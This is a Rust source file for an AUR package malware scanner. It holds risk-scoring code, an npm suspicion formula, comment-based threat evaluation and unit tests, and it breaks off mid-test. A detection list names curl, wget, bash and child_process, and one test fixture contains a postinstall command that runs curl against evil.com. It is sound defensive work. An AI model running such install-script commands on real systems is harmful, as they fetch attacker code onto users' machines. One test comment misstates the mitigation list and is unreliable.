use crate::shared::models::{CommentEntry, MaintainerInfo, NpmPackageInfo};
use serde::Serialize;

/// A signal emitted by a feature during analysis.
#[derive(Debug, Clone, Serialize)]
pub struct Signal {
    pub id: String,
    pub category: SignalCategory,
    pub points: u32,
    pub description: String,
    pub is_override_gate: bool,
    /// If true, this signal alone is sufficient to classify the package as Malicious (trust 0).
    pub is_critical: bool,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub matched_line: Option<String>,
}

/// The four weighted signal categories.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize)]
pub enum SignalCategory {
    Metadata,
    Pkgbuild,
    Behavioral,
    Temporal,
}

/// Trust tier derived from the final score.
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Serialize)]
pub enum Tier {
    Trusted,
    Ok,
    Sketchy,
    Suspicious,
    Malicious,
}

/// Complete result of scanning a package.
#[derive(Debug, Serialize)]
pub struct ScanResult {
    pub package: String,
    pub score: u32,
    pub tier: Tier,
    pub signals: Vec<Signal>,
    pub override_gate_fired: Option<String>,
}

/// Context data required by the scoring engine (extracted from PackageContext).
pub struct ScoreInput<'a> {
    pub maintainer_info: Option<&'a MaintainerInfo>,
    pub votes: u32,
    pub popularity: f64,
    pub has_orphan_takeover: bool,
    pub has_new_malicious_diff: bool,
    pub npm_info: Option<&'a NpmPackageInfo>,
    pub has_community_malware_warning: bool,
}

/// Category weights for the weighted risk calculation.
const WEIGHT_METADATA: f64 = 0.15;
const WEIGHT_PKGBUILD: f64 = 0.45;
const WEIGHT_BEHAVIORAL: f64 = 0.25;
const WEIGHT_TEMPORAL: f64 = 0.15;

/// Security keywords for AUR comment malware detection.
const SECURITY_KEYWORDS: &[&str] = &[
    "malware",
    "backdoor",
    "trojan",
    "keylogger",
    "cryptominer",
    "ransomware",
    "rootkit",
    "compromised",
    "virus",
    "suspicious",
    "malicious",
    "spyware",
    "unsafe",
    "dangerous",
    "phishing",
    "exploit",
];

/// Compute the final score and tier using the context-aware scoring pipeline.
///
/// Pipeline order:
/// 1. Community malware warning → Malicious (trust 0)
/// 2. Critical gate signals → Malicious (trust 0)
/// 3. Override gate signals → Malicious (risk = max(gate_points, weighted_risk))
/// 4. Base weighted risk from remaining signals
/// 5. Maintainer trust multiplier
/// 6. Popularity penalties
/// 7. Orphan + malicious diff boost
/// 8. NPM suspicion risk
/// 9. Clamp → trust → tier
pub fn compute_score(package_name: &str, signals: &[Signal], input: &ScoreInput) -> ScanResult {
    // ── 1. Community malware warning override ──
    if input.has_community_malware_warning {
        let override_gate = signals
            .iter()
            .find(|s| s.id == "M-COMMENTS-SECURITY");
        return ScanResult {
            package: package_name.to_string(),
            score: 0,
            tier: Tier::Malicious,
            signals: signals.to_vec(),
            override_gate_fired: override_gate.map(|s| s.id.clone()),
        };
    }

    // ── 2. Critical gate signals ──
    let critical = signals.iter().find(|s| s.is_critical);
    if let Some(sig) = critical {
        return ScanResult {
            package: package_name.to_string(),
            score: 0,
            tier: Tier::Malicious,
            signals: signals.to_vec(),
            override_gate_fired: Some(sig.id.clone()),
        };
    }

    // ── 3. Override gate signals (legacy behaviour: Malicious with max-risk) ──
    let best_override = signals
        .iter()
        .filter(|s| s.is_override_gate)
        .max_by_key(|s| s.points);

    if let Some(signal) = best_override {
        let weighted_risk = compute_weighted_risk(signals);
        let risk = (signal.points as u32).max(weighted_risk).min(100);
        return ScanResult {
            package: package_name.to_string(),
            score: 100 - risk,
            tier: Tier::Malicious,
            signals: signals.to_vec(),
            override_gate_fired: Some(signal.id.clone()),
        };
    }

    // ── 4. Base weighted risk ──
    let base_risk = compute_weighted_risk(signals) as f64;

    // ── 5. Maintainer trust multiplier ──
    let m_trust = input
        .maintainer_info
        .as_ref()
        .map(|m| maintainer_trust_factor(m))
        .unwrap_or(0.5); // neutral when no info
    // trust_factor 0..1 → risk multiplier 1.5 when trust 0, 0.8 when trust 1
    let trust_multiplier = lerp(1.5, 0.8, m_trust);
    let mut risk = base_risk * trust_multiplier;

    // ── 6. Popularity penalty ──
    if input.votes == 0 && input.popularity == 0.0 {
        risk += 15.0;
    } else if input.votes < 3 && input.popularity < 0.01 {
        risk += 5.0;
    }

    // ── 7. Orphan takeover + new malicious diff boost ──
    if input.has_orphan_takeover && input.has_new_malicious_diff {
        risk = risk.max(95.0);
    }

    // ── 8. NPM suspicion risk ──
    if let Some(npm) = input.npm_info {
        risk += npm_suspicion_risk(npm) as f64;
    }

    // ── 9. Clamp, trust, tier ──
    risk = risk.clamp(0.0, 100.0);
    let trust = (100.0 - risk).round() as u32;
    let tier = score_to_tier(trust);

    ScanResult {
        package: package_name.to_string(),
        score: trust,
        tier,
        signals: signals.to_vec(),
        override_gate_fired: None,
    }
}

/// Compute the weighted composite risk from signals (without override gate logic).
fn compute_weighted_risk(signals: &[Signal]) -> u32 {
    let mut meta_total: u32 = 0;
    let mut pkgbuild_total: u32 = 0;
    let mut behavioral_total: u32 = 0;
    let mut temporal_total: u32 = 0;

    for signal in signals {
        match signal.category {
            SignalCategory::Metadata => meta_total += signal.points,
            SignalCategory::Pkgbuild => pkgbuild_total += signal.points,
            SignalCategory::Behavioral => behavioral_total += signal.points,
            SignalCategory::Temporal => temporal_total += signal.points,
        }
    }

    meta_total = meta_total.min(100);
    pkgbuild_total = pkgbuild_total.min(100);
    behavioral_total = behavioral_total.min(100);
    temporal_total = temporal_total.min(100);

    let weighted = (WEIGHT_METADATA * meta_total as f64)
        + (WEIGHT_PKGBUILD * pkgbuild_total as f64)
        + (WEIGHT_BEHAVIORAL * behavioral_total as f64)
        + (WEIGHT_TEMPORAL * temporal_total as f64);

    (weighted.round() as u32).min(100)
}

/// Compute maintainer trust factor: 0.0 (very suspicious) to 1.0 (fully trusted).
fn maintainer_trust_factor(info: &MaintainerInfo) -> f64 {
    let now = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap()
        .as_secs();

    let age_days = (now.saturating_sub(info.account_created_date)) as f64 / 86400.0;

    // Base trust on account age (older is better, up to 1 year to reach 1.0)
    let age_trust = (age_days / 365.0).clamp(0.0, 1.0);

    // Package count contribution (more packages = more experience)
    let count_trust = (info.number_of_packages as f64 / 10.0).clamp(0.2, 1.0);

    // Takeover penalty: if not original submitter, reduce trust based on recency
    let takeover_penalty = if info.is_original_submitter {
        1.0
    } else {
        match info.days_since_takeover {
            None => 0.0,                           // orphan takeover but no info → worst case
            Some(d) => (d as f64 / 30.0).clamp(0.0, 1.0), // reach full trust after 30 days
        }
    };

    // Combine: weight takeover and age more heavily
    0.3 * age_trust + 0.2 * count_trust + 0.5 * takeover_penalty
}

/// Maximum NPM suspicion risk in points.
const R_MAX: u32 = 30;

/// Botting risk: κ controls the stars-to-interaction ratio curve.
const KAPPA: f64 = 5.0;

/// Documentation risk: λ controls how quickly README size reduces risk.
const LAMBDA: f64 = 0.01;

/// Takeover anomaly: τ = dormancy threshold (months), k = sigmoid steepness.
const TAU: f64 = 12.0;
const K_FACTOR: f64 = 1.0;

/// Burner account risk: γ = 0.023 gives a 30-day half-life.
const GAMMA: f64 = 0.023;

/// NPM install script commands considered a critical payload signature.
/// The presence of any of these triggers Ω = Rmax in the Snpm formula.
const NPM_CRITICAL_COMMANDS: &[&str] = &[
    "eval",
    "exec",
    "child_process",
    "curl",
    "wget",
    "base64",
    "bash",
    "sh ",
];

// ─────────────────────────────────────────────────────────────
// NPM Suspicion Score (Snpm) — four-component weighted model
// ─────────────────────────────────────────────────────────────
//
//   Snpm = min( Rmax,  Σ Wi·fi(x)  +  Ω )
//
// where Ω = Rmax if a critical payload signature is detected in
// lifecycle scripts, and 0 otherwise.
//
// ──── Components ────────────────────────────────────────────
//
// 1. f_bot (Botting Risk)     W=15   κ=5.0
//    f_bot(S, A) = S / [S + κ·(A+1)²]
//    S = stars, A = forks + closed_issues
//    → punishes inflated stars with no human interaction.
//    Ex: 50★/5 forks → 0.21;  500★/0 forks → 0.99;  5000★/500 → 0.004
//
// 2. f_doc (Documentation Risk)  W=5   λ=0.01
//    f_doc(L) = e^(-λ·L)
//    L = README bytes
//    → empty README is a red flag; 200+ bytes is safe.
//    Ex: L=0→1.0;  L=50→0.60;  L=200→0.13
//
// 3. f_time (Takeover Anomaly)   W=15   k=1.0   τ=12.0
//    f_time(Δt, C) = C · 1/[1 + e^(-k(Δt - τ))]
//    Δt = months since last commit, C ∈ {0,1} (burner proxy)
//    → dormant package suddenly revived by burner account.
//    Ex: Δt=3→0.0001;  Δt=12→0.50;  Δt=18→0.997
//
// 4. f_auth (Burner Account)   W=10   γ=0.023 (30-day half-life)
//    f_auth(D) = e^(-γ·D)
//    D = npm account age in days
//    → new accounts are far riskier.
//    Ex: D=1→0.97;  D=30→0.50;  D=90→0.12

/// Compute the NPM Suspicion Score for a package's npm dependency metadata.
///
/// Returns 0-30 points added to the PKGBUILD risk score.
/// A high score (≥25) indicates the npm dependency itself is suspicious
/// and can trigger the critical gate in the scoring pipeline.
///
/// See the module documentation above for the full mathematical formula.
pub(crate) fn npm_suspicion_risk(info: &NpmPackageInfo) -> u32 {
    // ── Omega: critical payload override ──
    let all_scripts = format!(
        "{} {} {}",
        info.scripts.preinstall, info.scripts.install, info.scripts.postinstall
    );
    let lower = all_scripts.to_lowercase();
    let has_critical_payload = NPM_CRITICAL_COMMANDS
        .iter()
        .any(|cmd| lower.contains(cmd));

    let omega: f64 = if has_critical_payload || info.repo_spoofed {
        R_MAX as f64
    } else {
        0.0
    };

    // ── f_bot: botting risk ──
    let s = info.github_stars as f64;
    let a = (info.github_forks + info.github_closed_issues) as f64;
    let f_bot = if info.github_repo_exists {
        s / (s + KAPPA * (a + 1.0).powi(2))
    } else {
        // No repo → maximum botting risk
        1.0
    };

    // ── f_doc: documentation risk ──
    let f_doc = {
        let l = info.github_readme_bytes as f64;
        (-LAMBDA * l).exp()
    };

    // ── f_time: takeover anomaly ──
    let f_time = {
        // C: burner proxy — an npm maintainer with only 1 published package
        // is treated as a likely burner account taking over a dormant package.
        let c = if info.maintainer_package_count <= 1 { 1.0 } else { 0.0 };
        let delta_t = info.github_commit_freshness as f64 / 30.0; // days → months
        let exponent = -K_FACTOR * (delta_t - TAU);
        c / (1.0 + exponent.exp())
    };

    // ── f_auth: burner account risk ──
    let f_auth = {
        let d = info.maintainer_account_age as f64;
        (-GAMMA * d).exp()
    };

    // ── Weighted sum + Omega, clamped to [0, Rmax] ──
    let sum = 15.0 * f_bot + 5.0 * f_doc + 15.0 * f_time + 10.0 * f_auth + omega;
    let risk = sum.clamp(0.0, R_MAX as f64);

    risk.round() as u32
}

/// Result of evaluating AUR comment security threat with time-awareness.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum CommentSecurityVerdict {
    /// No security threat detected in comments.
    Clean,
    /// Override gate should fire → Malicious (trust 0).
    OverrideFire,
    /// Threat exists but degraded by age or mitigation.
    /// The M-COMMENTS-SECURITY signal should have is_override_gate=false
    /// and its points reduced to this value.
    Degraded { points: u32 },
    /// Threat pattern is too old → remove M-COMMENTS-SECURITY signal entirely.
    Ignored,
}

/// Phrases indicating a comment is mitigating or reassuring about a prior concern.
/// ── Comment threat evaluation tunables ──
/// Age thresholds for high/moderate popularity repos (< 3 votes, < 0.01 pop).
const HIGH_POP_OVERRIDE_DAYS: i64 = 7;       // < this → OverrideFire
const HIGH_POP_DEGRADE_DAYS: i64 = 60;        // < this → Degraded, >= this → Ignored
const HIGH_POP_DEGRADED_POINTS: u32 = 20;

/// Age thresholds for low popularity repos (votes < 3 && popularity < 0.01).
const LOW_POP_DEGRADE_NEAR_DAYS: i64 = 30;    // < this → Degraded(20) with mitigation
const LOW_POP_DEGRADE_MID_DAYS: i64 = 60;     // < this → Degraded(10) with mitigation
const LOW_POP_ORPHAN_OVERRIDE_DAYS: i64 = 60; // >= this without mitigation → OverrideFire
const LOW_POP_DEGRADED_NEAR_POINTS: u32 = 20;
const LOW_POP_DEGRADED_FAR_POINTS: u32 = 10;
const MITIGATION_FOLLOWUP_DELAY_SECS: i64 = 3 * 86400; // new comment after this → counts as follow-up

/// Phrases indicating a comment is mitigating or reassuring about a prior concern.
const MITIGATION_PHRASES: &[&str] = &[
    "patched",
    "fixed",
    "resolved",
    "not compromised",
    "false alarm",
    "false positive",
    "different package",
    "removed",
    "addressed",
    "taken down",
];

/// Evaluate AUR comment security threat with time-awareness.
///
/// Rules for **high/moderate popularity** repos (votes >= 3 || popularity >= 0.01):
///   - Latest danger comment < 7 days old → OverrideFire
///   - Latest danger comment 7 days – 2 months old → Degraded (20 pts)
///   - Latest danger comment > 2 months old → Ignored
///
/// Rules for **low popularity** repos (votes < 3 && popularity < 0.01):
///   IF mitigation/follow-up comments exist after the latest danger comment:
///     - Latest danger < 1 month old → Degraded (20 pts)
///     - Latest danger 1–2 months old → Degraded (10 pts)
///     - Latest danger > 2 months old → Degraded (10 pts, never ignored)
///   IF no mitigation/follow-up comments AND latest danger > 2 months:
///     → OverrideFire (orphaned warning, always fires)
///   Otherwise (no mitigation, < 2 months) → OverrideFire (default)
pub fn evaluate_comment_threat(
    comments: &[CommentEntry],
    votes: u32,
    popularity: f64,
) -> CommentSecurityVerdict {
    // Get current time
    let now = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap()
        .as_secs() as i64;

    let is_low_popularity = votes < 3 && popularity < 0.01;

    // Find the newest comment that contains a security keyword
    let mut latest_danger: Option<(i64, &str)> = None;
    for entry in comments {
        let lower = entry.text.to_lowercase();
        if SECURITY_KEYWORDS.iter().any(|kw| lower.contains(kw)) {
            // Check if this comment is actually mitigation (contains danger keyword
            // but also mitigation phrases, e.g. "malware is from another package")
            let is_mitigation = MITIGATION_PHRASES
                .iter()
                .any(|mp| lower.contains(mp));
            if is_mitigation {
                continue; // skip — this comment is reassuring, not warning
            }
            // Track the latest danger comment
            if latest_danger.map_or(true, |(ts, _)| entry.timestamp > ts) {
                latest_danger = Some((entry.timestamp, &entry.text));
            }
        }
    }

    let (danger_time, _danger_text) = match latest_danger {
        Some(d) => d,
        None => return CommentSecurityVerdict::Clean,
    };

    let age_seconds = (now - danger_time).max(0);
    let age_days = age_seconds / 86400;

    if is_low_popularity {
        // Check for mitigation or follow-up comments after the danger comment
        let has_mitigation = comments.iter().any(|entry| {
            if entry.timestamp <= danger_time {
                return false;
            }
            let lower = entry.text.to_lowercase();
            // Mitigation comment: contains mitigation phrases
            // OR: a non-danger comment posted > MITIGATION_FOLLOWUP_DELAY_SECS after danger
            let is_mitigation_phrase = MITIGATION_PHRASES
                .iter()
                .any(|mp| lower.contains(mp));
            if is_mitigation_phrase {
                return true;
            }
            // Follow-up: any comment without security keywords after the delay
            let seconds_after = entry.timestamp - danger_time;
            let has_danger = SECURITY_KEYWORDS
                .iter()
                .any(|kw| lower.contains(kw));
            !has_danger && seconds_after > MITIGATION_FOLLOWUP_DELAY_SECS
        });

        if has_mitigation {
            if age_days < LOW_POP_DEGRADE_NEAR_DAYS {
                CommentSecurityVerdict::Degraded { points: LOW_POP_DEGRADED_NEAR_POINTS }
            } else if age_days < LOW_POP_DEGRADE_MID_DAYS {
                CommentSecurityVerdict::Degraded { points: LOW_POP_DEGRADED_FAR_POINTS }
            } else {
                // > LOW_POP_DEGRADE_MID_DAYS, continue to lower but don't ignore
                CommentSecurityVerdict::Degraded { points: LOW_POP_DEGRADED_FAR_POINTS }
            }
        } else if age_days > LOW_POP_ORPHAN_OVERRIDE_DAYS {
            // No mitigation, older than threshold → always OverrideFire
            CommentSecurityVerdict::OverrideFire
        } else {
            // No mitigation, under threshold → default OverrideFire
            CommentSecurityVerdict::OverrideFire
        }
    } else {
        // High/moderate popularity
        if age_days < HIGH_POP_OVERRIDE_DAYS {
            CommentSecurityVerdict::OverrideFire
        } else if age_days < HIGH_POP_DEGRADE_DAYS {
            CommentSecurityVerdict::Degraded { points: HIGH_POP_DEGRADED_POINTS }
        } else {
            CommentSecurityVerdict::Ignored
        }
    }
}

/// Check if any AUR comments contain security keywords (no time-awareness).
/// Used by external code that needs a simple yes/no without time degradation.
#[allow(dead_code)]
pub fn comment_contains_malware_warning(comments: &[CommentEntry]) -> bool {
    comments.iter().any(|c| {
        let lower = c.text.to_lowercase();
        SECURITY_KEYWORDS.iter().any(|kw| lower.contains(kw))
    })
}

/// Linear interpolation: a + (b - a) * t
fn lerp(a: f64, b: f64, t: f64) -> f64 {
    a + (b - a) * t
}

fn score_to_tier(trust: u32) -> Tier {
    match trust {
        0..=20 => Tier::Malicious,
        21..=40 => Tier::Suspicious,
        41..=60 => Tier::Sketchy,
        61..=80 => Tier::Ok,
        _ => Tier::Trusted,
    }
}

impl std::fmt::Display for Tier {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Tier::Trusted => write!(f, "TRUSTED"),
            Tier::Ok => write!(f, "OK"),
            Tier::Sketchy => write!(f, "SKETCHY"),
            Tier::Suspicious => write!(f, "SUSPICIOUS"),
            Tier::Malicious => write!(f, "MALICIOUS"),
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn signal(id: &str, category: SignalCategory, points: u32, override_gate: bool) -> Signal {
        signal_crit(id, category, points, override_gate, false)
    }

    fn signal_crit(
        id: &str,
        category: SignalCategory,
        points: u32,
        override_gate: bool,
        is_critical: bool,
    ) -> Signal {
        Signal {
            id: id.to_string(),
            category,
            points,
            description: String::new(),
            is_override_gate: override_gate,
            is_critical,
            matched_line: None,
        }
    }

    fn empty_input() -> ScoreInput<'static> {
        ScoreInput {
            maintainer_info: None,
            votes: 10,
            popularity: 1.0,
            has_orphan_takeover: false,
            has_new_malicious_diff: false,
            npm_info: None,
            has_community_malware_warning: false,
        }
    }

    #[test]
    fn no_signals_scores_full_trust() {
        let result = compute_score("pkg", &[], &empty_input());
        assert_eq!(result.score, 100);
        assert_eq!(result.tier, Tier::Trusted);
        assert!(result.override_gate_fired.is_none());
    }

    #[test]
    fn override_gate_picks_highest() {
        let signals = vec![
            signal("P-CURL-PIPE", SignalCategory::Pkgbuild, 90, true),
            signal("P-REVSHELL-DEVTCP", SignalCategory::Pkgbuild, 95, true),
        ];
        let result = compute_score("pkg", &signals, &empty_input());
        assert_eq!(result.tier, Tier::Malicious);
        assert_eq!(
            result.override_gate_fired.as_deref(),
            Some("P-REVSHELL-DEVTCP")
        );
        assert!(result.score <= 5, "Trust {} should be <= 5", result.score);
    }

    #[test]
    fn override_gate_uses_weighted_when_higher() {
        let signals = vec![
            signal("P-REVSHELL-PYTHON", SignalCategory::Pkgbuild, 85, true),
            signal("P-EVAL-BASE64", SignalCategory::Pkgbuild, 85, false),
            signal("B-NAME-IMPERSONATE", SignalCategory::Behavioral, 65, false),
            signal("M-VOTES-ZERO", SignalCategory::Metadata, 30, false),
            signal("T-MALICIOUS-DIFF", SignalCategory::Temporal, 55, false),
        ];
        let result = compute_score("pkg", &signals, &empty_input());
        assert_eq!(result.tier, Tier::Malicious);
        // Weighted risk: 0.45*100 + 0.25*65 + 0.15*30 + 0.15*55 = 74
        // Override gate risk: 85. Max(85, 74) = 85. Trust = 100 - 85 = 15
        assert!(
            result.score <= 15,
            "Trust {} should be <= 15",
            result.score
        );
    }

    #[test]
    fn category_caps_at_100() {
        let signals = vec![
            signal("P-A", SignalCategory::Pkgbuild, 80, false),
            signal("P-B", SignalCategory::Pkgbuild, 80, false),
        ];
        let result = compute_score("pkg", &signals, &empty_input());
        // Pkgbuild: min(160, 100) = 100 -> 0.45 * 100 = 45 base risk
        // Neutral maintainer trust: 0.5 -> multiplier = lerp(1.5, 0.8, 0.5) = 1.15
        // risk = 45 * 1.15 ≈ 52 -> trust ≈ 48, tier = Sketchy
        assert_eq!(result.score, 48);
        assert_eq!(result.tier, Tier::Sketchy);
    }

    #[test]
    fn tier_boundaries() {
        assert_eq!(score_to_tier(0), Tier::Malicious);
        assert_eq!(score_to_tier(20), Tier::Malicious);
        assert_eq!(score_to_tier(21), Tier::Suspicious);
        assert_eq!(score_to_tier(40), Tier::Suspicious);
        assert_eq!(score_to_tier(41), Tier::Sketchy);
        assert_eq!(score_to_tier(60), Tier::Sketchy);
        assert_eq!(score_to_tier(61), Tier::Ok);
        assert_eq!(score_to_tier(80), Tier::Ok);
        assert_eq!(score_to_tier(81), Tier::Trusted);
        assert_eq!(score_to_tier(100), Tier::Trusted);
    }

    #[test]
    fn min_trust_is_zero() {
        let signals = vec![
            signal("P", SignalCategory::Pkgbuild, 200, false),
            signal("M", SignalCategory::Metadata, 200, false),
            signal("B", SignalCategory::Behavioral, 200, false),
            signal("T", SignalCategory::Temporal, 200, false),
        ];
        let result = compute_score("pkg", &signals, &empty_input());
        assert_eq!(result.score, 0);
    }

    // ── New tests for context-aware scoring ──

    #[test]
    fn community_malware_warning_overrides_everything() {
        let signals = vec![
            signal("P-SAFE", SignalCategory::Pkgbuild, 5, false),
        ];
        let input = ScoreInput {
            has_community_malware_warning: true,
            ..empty_input()
        };
        let result = compute_score("pkg", &signals, &input);
        assert_eq!(result.score, 0);
        assert_eq!(result.tier, Tier::Malicious);
    }

    #[test]
    fn critical_signal_forces_malicious() {
        let signals = vec![
            signal_crit("CRIT-SHELL", SignalCategory::Pkgbuild, 95, false, true),
            signal("P-SAFE", SignalCategory::Pkgbuild, 5, false),
        ];
        let result = compute_score("pkg", &signals, &empty_input());
        assert_eq!(result.score, 0);
        assert_eq!(result.tier, Tier::Malicious);
        assert_eq!(result.override_gate_fired.as_deref(), Some("CRIT-SHELL"));
    }

    #[test]
    fn popularity_zero_penalty() {
        let signals = vec![
            signal("P-CURL", SignalCategory::Pkgbuild, 30, false),
        ];
        let input = ScoreInput {
            votes: 0,
            popularity: 0.0,
            ..empty_input()
        };
        let result = compute_score("pkg", &signals, &input);
        // weighted: 0.45*30=13.5 → 14, +15 penalty = 29 risk, trust=71, tier=OK
        // with neutral maintainer trust 0.5: 14 * 1.15 = 16.1 + 15 = 31.1 risk, trust ≈ 69
        assert!(result.score < 75, "Trust {} should be < 75", result.score);
    }

    #[test]
    fn orphan_plus_malicious_diff_boost() {
        let signals = vec![
            signal("P-CURL", SignalCategory::Pkgbuild, 30, false),
        ];
        let input = ScoreInput {
            has_orphan_takeover: true,
            has_new_malicious_diff: true,
            ..empty_input()
        };
        let result = compute_score("pkg", &signals, &input);
        // Risk ≥ 95 → trust ≤ 5 → Malicious
        assert_eq!(result.tier, Tier::Malicious);
        assert!(result.score <= 5, "Trust {} should be <= 5", result.score);
    }

    #[test]
    fn maintainer_trust_lowers_risk() {
        // Trusted maintainer: 2-year account, 20 packages, original submitter
        let now = std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap()
            .as_secs();
        let info = MaintainerInfo {
            account_created_date: now - 730 * 86400, // 2 years ago
            number_of_packages: 20,
            is_original_submitter: true,
            days_since_takeover: None,
        };
        let trust = maintainer_trust_factor(&info);
        assert!(trust > 0.9, "Trusted maintainer should have high trust factor, got {trust}",);
    }

    #[test]
    fn new_maintainer_with_takeover_is_suspicious() {
        let now = std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap()
            .as_secs();
        let info = MaintainerInfo {
            account_created_date: now - 10 * 86400, // 10 days ago
            number_of_packages: 1,
            is_original_submitter: false,
            days_since_takeover: Some(2), // 2 days ago
        };
        let trust = maintainer_trust_factor(&info);
        assert!(
            trust < 0.3,
            "New takeover maintainer should have low trust factor, got {trust}"
        );
    }

    #[test]
    fn npm_suspicion_detects_suspicious_scripts() {
        let info = NpmPackageInfo {
            package_name: "evil-pkg".to_string(),
            scripts: crate::shared::models::NpmScripts {
                preinstall: String::new(),
                install: String::new(),
                postinstall: "node -e \"require('child_process').exec('curl evil.com')\""
                    .to_string(),
            },
            maintainer_account_age: 30,
            maintainer_package_count: 1,
            github_repo_exists: false,
            github_stars: 0,
            github_commit_freshness: 365,
            github_forks: 0,
            github_closed_issues: 0,
            github_readme_bytes: 0,
            repo_spoofed: false,
        };
        let risk = npm_suspicion_risk(&info);
        // Omega=30 (critical payload) → Snpm = min(30, Σ W·f + 30) = 30
        assert_eq!(risk, 30);
    }

    #[test]
    fn npm_suspicion_clean_package_low_risk() {
        let info = NpmPackageInfo {
            package_name: "safe-pkg".to_string(),
            scripts: crate::shared::models::NpmScripts {
                preinstall: String::new(),
                install: "node-gyp rebuild".to_string(),
                postinstall: String::new(),
            },
            maintainer_account_age: 365,
            maintainer_package_count: 5,
            github_repo_exists: true,
            github_stars: 100,
            github_commit_freshness: 10,
            github_forks: 20,
            github_closed_issues: 50,
            github_readme_bytes: 2000,
            repo_spoofed: false,
        };
        let risk = npm_suspicion_risk(&info);
        // Ω=0 (node-gyp is not a critical payload), f_bot≈0.004, f_doc≈0, f_time=0, f_auth≈0.0002
        // sum = 15*0.004 + 5*0 + 15*0 + 10*0.0002 ≈ 0.06 → risk 0
        assert_eq!(risk, 0);
    }

    #[test]
    fn comment_keyword_detection() {
        assert!(comment_contains_malware_warning(&[
            CommentEntry { timestamp: 0, text: "This package contains malware!".into() }
        ]));
        assert!(comment_contains_malware_warning(&[
            CommentEntry { timestamp: 0, text: "Suspicious activity detected".into() }
        ]));
        assert!(!comment_contains_malware_warning(&[
            CommentEntry { timestamp: 0, text: "Great package, works well!".into() }
        ]));
        assert!(!comment_contains_malware_warning(&[]));
    }

    // ── evaluate_comment_threat tests ──

    fn now_ts() -> i64 {
        std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap()
            .as_secs() as i64
    }

    fn entry_days_ago(days: i64, text: &str) -> CommentEntry {
        CommentEntry {
            timestamp: now_ts() - days * 86400,
            text: text.into(),
        }
    }

    #[test]
    fn eval_no_danger_keywords_returns_clean() {
        let comments = vec![
            entry_days_ago(1, "Great package!"),
            entry_days_ago(5, "Works perfectly"),
        ];
        assert_eq!(
            evaluate_comment_threat(&comments, 10, 1.0),
            CommentSecurityVerdict::Clean
        );
    }

    #[test]
    fn eval_high_pop_recent_danger_override() {
        let comments = vec![
            entry_days_ago(3, "This package contains malware!"),
        ];
        assert_eq!(
            evaluate_comment_threat(&comments, 10, 1.0),
            CommentSecurityVerdict::OverrideFire
        );
    }

    #[test]
    fn eval_high_pop_week_old_degraded() {
        let comments = vec![
            entry_days_ago(10, "This package contains malware!"),
        ];
        assert_eq!(
            evaluate_comment_threat(&comments, 10, 1.0),
            CommentSecurityVerdict::Degraded { points: 20 }
        );
    }

    #[test]
    fn eval_high_pop_old_ignored() {
        let comments = vec![
            entry_days_ago(90, "This package contains malware!"),
        ];
        assert_eq!(
            evaluate_comment_threat(&comments, 10, 1.0),
            CommentSecurityVerdict::Ignored
        );
    }

    #[test]
    fn eval_low_pop_recent_with_mitigation_degraded() {
        // Mitigation comment posted after the danger comment
        let comments = vec![
            entry_days_ago(1, "Package has been patched, safe now"),  // mitigation (newer)
            entry_days_ago(5, "This package contains malware!"),      // danger (older)
        ];
        assert_eq!(
            evaluate_comment_threat(&comments, 0, 0.0),
            CommentSecurityVerdict::Degraded { points: 20 }
        );
    }

    #[test]
    fn eval_low_pop_old_no_mitigation_override() {
        let comments = vec![
            entry_days_ago(90, "This package contains malware!"),
        ];
        assert_eq!(
            evaluate_comment_threat(&comments, 0, 0.0),
            CommentSecurityVerdict::OverrideFire
        );
    }

    #[test]
    fn eval_mitigation_comment_not_counted_as_danger() {
        // Comment contains "malware" but also "not compromised" → should be skipped
        let comments = vec![
            entry_days_ago(1, "Note that the malware is from another package. This one is not compromised."),
        ];
        assert_eq!(
            evaluate_comment_threat(&comments, 10, 1.0),
            CommentSecurityVerdict::Clean
        );
    }

    #[test]
    fn eval_followup_comment_counts_as_mitigation() {
        // Follow-up comment without danger keywords > 3 days after danger
        let comments = vec![
            entry_days_ago(1, "Thanks for the update!"),              // follow-up (newer)
            entry_days_ago(10, "This package contains malware!"),     // danger (older)
        ];
        assert_eq!(
            evaluate_comment_threat(&comments, 0, 0.0),
            CommentSecurityVerdict::Degraded { points: 20 }
        );
    }

    #[test]
    fn eval_low_pop_1_to_2_months_mitigation_further_degraded() {
        let comments = vec![
            entry_days_ago(1, "Fixed in latest version"),   // mitigation
            entry_days_ago(45, "This package contains malware!"),
        ];
        assert_eq!(
            evaluate_comment_threat(&comments, 0, 0.0),
            CommentSecurityVerdict::Degraded { points: 10 }
        );
    }

    #[test]
    fn eval_low_pop_over_2_months_mitigation_still_degraded() {
        let comments = vec![
            entry_days_ago(1, "Resolved now"),              // mitigation
            entry_days_ago(90, "This package contains malware!"),
        ];
        assert_eq!(
            evaluate_comment_threat(&comments, 0, 0.0),
            CommentSecurityVerdict::Degraded { points: 10 }
        );
    }

    #[test]
    fn eval_empty_comments_clean() {
        assert_eq!(
            evaluate_comment_threat(&[], 0, 0.0),
            CommentSecurityVerdict::Clean
        );
    }

    #[test]
    fn eval_moderate_pop_treated_as_high() {
        // votes=3 is the boundary — should be "high/moderate"
        let comments = vec![
            entry_days_ago(10, "This package contains malware!"),
        ];
        assert_eq!(
            evaluate_comment_threat(&comments, 3, 0.0),
            CommentSecurityVerdict::Degraded { points: 20 }
        );
    }

    #[test]
    fn eval_low_pop_recent_no_mitigation_override() {
        // Low pop, 5 days ago, no mitigation → default OverrideFire
        let comments = vec![
            entry_days_ago(5, "This package contains a backdoor!"),
        ];
        assert_eq!(
            evaluate_comment_threat(&comments, 0, 0.0),
            CommentSecurityVerdict::OverrideFire
        );
    }

    #[test]
    fn eval_attacker_says_safe_after_malware_report() {
        // Attacker posts "It's safe!" immediately after a user reports "Malware!"
        // on a low-popularity repo. The word "safe" is in MITIGATION_PHRASES,
        // so it is treated as mitigation and degrades the override gate.
        let comments = vec![
